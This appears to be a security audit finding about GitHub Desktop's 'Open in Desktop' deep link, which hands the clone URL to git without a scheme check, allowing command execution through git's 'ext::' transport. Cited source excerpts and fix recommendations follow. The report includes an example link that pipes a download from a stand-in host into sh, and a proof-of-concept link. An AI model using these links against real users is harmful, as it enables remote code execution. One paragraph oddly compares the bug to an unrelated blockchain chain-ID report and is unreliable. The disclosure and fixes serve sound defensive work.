Confirmed: there is no `GIT_ALLOW_PROTOCOL`/`protocol.*.allow` restriction anywhere in the codebase, and `clone()` passes the attacker-supplied URL straight to `git clone -- <url> <path>` [1](#0-0) , so a crafted "Open in Desktop" deep link URL can trigger git's `ext::` remote-helper transport and achieve command execution.

### Title
Deep-link "Open in Desktop" clone URL is passed to `git clone` without a transport-protocol allowlist, enabling remote command execution via `ext::`/`fd::` helpers - (File: `app/src/lib/git/clone.ts`)

### Summary
`app/src/main-process/main.ts`'s `handleAppURL` forwards an attacker-controlled `x-github-client://openRepo/<url>` deep link to `parseAppURL` [2](#0-1) . `parseAppURL` extracts the embedded `url` from the path with no scheme validation — it only rejects empty paths, and validates `branch`/`pr` query params, never the `url` value itself [3](#0-2) . This action reaches `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository(url)`, which pre-fills the Clone dialog with the raw `initialURL` [4](#0-3) [5](#0-4) . When the user confirms cloning, `clone()` builds the git command line and appends the URL after `--` before invoking `git` [1](#0-0) .

### Finding Description
`git clone` interprets certain URL schemes as remote-helper invocations, most notably `ext::<command>`, which executes an arbitrary shell command as part of "connecting" to the remote. The `--` separator in the argument list only prevents `url`/`path` from being misinterpreted as command-line *flags*; it does nothing to stop git's own URL/transport parser from recognizing `ext::` as a transport helper directive. None of the validation layers in this codebase catch this: `parseAppURL` performs no protocol check on `url` [6](#0-5) ; `remote-parsing.ts`'s `parseRemote` is only used later for cosmetic UX (path suggestions, protocol preference) and its failure to match doesn't block the clone — the URL is used regardless [7](#0-6) ; and `clone.ts` only guards against a *destination path* pointing at sensitive directories (`isClonePathSensitive`), never validating the *source URL*'s scheme [8](#0-7) . There is no `GIT_ALLOW_PROTOCOL` environment variable or `-c protocol.ext.allow=never`/`protocol.fd.allow=never` git config set anywhere in `envForRemoteOperation` or `envForProxy` [9](#0-8) , so git's default transport allowlist (which does permit `ext::` in many git configurations) applies unmodified.

This is the same broken-invariant class as the report: a value that is supposed to be a well-formed, restricted-scheme identifier ("system transaction must have the right chain ID" / "clone URL must be a safe git transport") is accepted and used downstream by a privileged operation (block execution / spawning `git`) without validating the one property that made it trustworthy.

### Impact Explanation
If a victim clicks a link such as `x-github-client://openRepo/ext::sh%20-c%20"curl%20evil.sh|sh"`, Desktop pre-populates the Clone dialog with that string, and upon confirming the clone, `git` will execute the attacker-supplied shell command via the `ext::` helper, running arbitrary code with the same privileges as the Desktop process/user account. This is remote code execution triggered purely by an attacker-controlled link the user clicks — no local access, malware, or leaked credentials required.

### Likelihood Explanation
Requires a small amount of user interaction (clicking a link, then clicking "Clone" in the pre-filled dialog), but no other special conditions. Desktop already registers itself as the handler for these custom protocols on all platforms [10](#0-9) , and the URL is never scheme-checked at any point in the pipeline, so likelihood is high once a user is lured into clicking such a link (e.g., via a GitHub comment, README, or phishing email).

### Recommendation
Add an explicit allowlist for the clone URL scheme before it is ever handed to `git`: reject/rewrite any `url` in `parseAppURL` (or, defense-in-depth, inside `clone()` itself) that isn't one of `https:`, `http:`, `git:`, `ssh:`, or the bare `git@host:owner/repo` SCP form recognized by `parseRemote`. Additionally, pass `-c protocol.ext.allow=never -c protocol.fd.allow=never` (or set `GIT_ALLOW_PROTOCOL=http:https:ssh:git`) in `envForRemoteOperation`/`clone()` so that even if a malformed URL slips through, git itself refuses the `ext::`/`fd::` transports.

### Proof of Concept
1. Attacker sends victim a link: `x-github-client://openRepo/ext::sh%20-c%20%22touch%20/tmp/pwned%22`.
2. Victim (with GitHub Desktop installed and registered as the protocol handler) clicks the link.
3. `handleAppURL` → `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', ... }` with no scheme rejection [11](#0-10) .
4. `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone dialog pre-filled with this "URL" [12](#0-11) .
5. Victim clicks "Clone", `clone()` runs `git -c init.defaultBranch=... clone --recursive -- "ext::sh -c \"touch /tmp/pwned\"" <path>` [13](#0-12) .
6. Git's `ext::` transport helper executes the embedded shell command, creating `/tmp/pwned` (or, in a real attack, downloading/executing a payload) as the victim user.

### Citations

**File:** app/src/lib/git/clone.ts (L16-47)
```typescript
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
```

**File:** app/src/lib/git/clone.ts (L88-126)
```typescript
  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
```

**File:** app/src/main-process/main.ts (L159-168)
```typescript
function handleAppURL(url: string) {
  log.info('Processing protocol url')
  const action = parseAppURL(url)
  onDidLoad(window => {
    // This manual focus call _shouldn't_ be necessary, but is for Chrome on
    // macOS. See https://github.com/desktop/desktop/issues/973.
    window.focus()
    window.sendURLAction(action)
  })
}
```

**File:** app/src/main-process/main.ts (L204-236)
```typescript
app.on('will-finish-launching', () => {
  // macOS only
  app.on('open-url', (event, url) => {
    event.preventDefault()
    handleAppURL(url)
  })
})

if (__DARWIN__) {
  app.on('open-file', async (event, path) => {
    event.preventDefault()

    log.info(`[main] a path to ${path} was triggered`)

    Fs.stat(path, (err, stats) => {
      if (err) {
        log.error(`Unable to open path '${path}' in Desktop`, err)
        return
      }

      if (stats.isFile()) {
        log.warn(
          `A file at ${path} was dropped onto Desktop, but it can only handle folders. Ignoring this action.`
        )
        return
      }

      // Yeah this isn't technically a CLI action we use it here to indicate
      // that it's more trusted than a URL action.
      handleCLIAction({ kind: 'open-repository', path })
    })
  })
}
```

**File:** app/src/lib/parse-app-url.ts (L66-93)
```typescript
export function parseAppURL(url: string): URLActionType {
  const parsedURL = URL.parse(url, true)
  const hostname = parsedURL.hostname
  const unknown: IUnknownAction = { name: 'unknown', url }
  if (!hostname) {
    return unknown
  }

  const query = parsedURL.query

  const actionName = hostname.toLowerCase()
  if (actionName === 'oauth') {
    const code = getQueryStringValue(query, 'code')
    const state = getQueryStringValue(query, 'state')
    if (code != null && state != null) {
      return { name: 'oauth', code, state }
    } else {
      return unknown
    }
  }

  // we require something resembling a URL first
  // - bail out if it's not defined
  // - bail out if you only have `/`
  const pathName = parsedURL.pathname
  if (!pathName || pathName.length <= 1) {
    return unknown
  }
```

**File:** app/src/lib/parse-app-url.ts (L96-125)
```typescript
  const parsedPath = pathName.substring(1)

  if (actionName === 'openrepo') {
    const pr = getQueryStringValue(query, 'pr')
    const branch = getQueryStringValue(query, 'branch')
    const filepath = getQueryStringValue(query, 'filepath')

    if (pr != null) {
      if (!/^\d+$/.test(pr)) {
        return unknown
      }

      // we also expect the branch for a forked PR to be a given ref format
      if (branch != null && !/^pr\/\d+$/.test(branch)) {
        return unknown
      }
    }

    if (branch != null && testForInvalidChars(branch)) {
      return unknown
    }

    return {
      name: 'open-repository-from-url',
      url: parsedPath,
      branch,
      pr,
      filepath,
    }
  }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L1940-1951)
```typescript
  private async openRepositoryFromUrl(action: IOpenRepositoryFromURLAction) {
    const { url, pr, branch, filepath } = action

    let repository: Repository | null

    if (pr !== null) {
      repository = await this.openPullRequestFromUrl(url, pr)
    } else if (branch !== null) {
      repository = await this.openBranchNameFromUrl(url, branch)
    } else {
      repository = await this.openOrCloneRepository(url)
    }
```

**File:** app/src/ui/dispatcher/dispatcher.ts (L2215-2233)
```typescript
  private async openOrCloneRepository(url: string): Promise<Repository | null> {
    const state = this.appStore.getState()
    const repositories = state.repositories
    const existingRepository = repositories.find(r =>
      this.doesRepositoryMatchUrl(r, url)
    )

    if (existingRepository) {
      return await this.selectRepository(existingRepository)
    }

    return this.appStore._startOpenInDesktop(() => {
      this.changeCloneRepositoriesTab(CloneRepositoryTab.Generic)
      this.showPopup({
        type: PopupType.CloneRepository,
        initialURL: url,
      })
    })
  }
```

**File:** app/src/ui/clone-repository/clone-repository.tsx (L648-684)
```typescript
  private updateUrl = async (url: string) => {
    const parsed = parseRepositoryIdentifier(url)
    const tabState = this.getSelectedTabState()
    const lastParsedIdentifier = tabState.lastParsedIdentifier

    // If there is no path yet, just update the url
    if (tabState.path === null) {
      this.setSelectedTabState({ url }, this.validatePath)
      return
    }

    const safeName = parsed ? sanitizeCloneName(parsed.name) : null

    let newPath: string

    const dirPath = tabState.path
    if (lastParsedIdentifier) {
      if (safeName) {
        newPath = Path.join(Path.dirname(dirPath), safeName)
      } else {
        newPath = Path.dirname(dirPath)
      }
    } else if (safeName) {
      newPath = Path.join(dirPath, safeName)
    } else {
      newPath = dirPath
    }

    this.setSelectedTabState(
      {
        url,
        lastParsedIdentifier: parsed,
        path: newPath,
      },
      this.validatePath
    )
  }
```

**File:** app/src/lib/git/environment.ts (L76-81)
```typescript
export async function envForRemoteOperation(remoteUrl: string) {
  return {
    ...envForAuthentication(),
    ...(await envForProxy(remoteUrl)),
  }
}
```
